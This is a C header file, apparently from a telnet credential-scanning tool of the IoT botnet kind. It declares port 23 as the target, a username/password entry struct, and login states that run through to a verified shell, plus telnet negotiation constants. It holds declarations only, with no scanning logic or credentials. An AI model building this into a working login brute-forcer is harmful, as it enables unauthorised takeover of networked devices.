#ifndef SCANNER_H
#define SCANNER_H

#define scan_port 23

#include "customize.h"
struct auth_entry {
	char* username;
	char* password;
	int name_len;
	int pass_len;
};

typedef enum {
	SOCKET_CLOSED,
	SOCKET_CONNECTING,
	TELNET_HANDLE_IAC,
	TELNET_SEND_USERNAME,
	TELNET_SEND_PASSWORD,
	TELNET_VERIFY_PASS,
	TELNET_VERIFY_SH,
	TELNET_LOGIN_SUCCESS
} status;

struct target{
	uint8_t data_buf[512];
	int data_len;
	int cfd;
	int last_start_time;
	int try_times;
	uint16_t port;
	ipv4_t ipaddr;
	status state;
	struct auth_entry *auth;
	int (*function)(struct target *conn);
}; 

#define PER_TIME_MAX 128
#define MAX_CONNECTION	128

/* telnet sub-protocol-negotiation */
#define IAC 0xff	//255
#define WILL 0xfb	//251
#define WONT 0xfc	//252
#define DO 0xfd		//253
#define DONT 0xfe	//254
#define SOBEGIN 0xfa	//250
#define SOEND 0xf0		//240	

#define WIN_TYPE 0x18	//24
#define WIN_SIZE 0x1f	//31

#endif
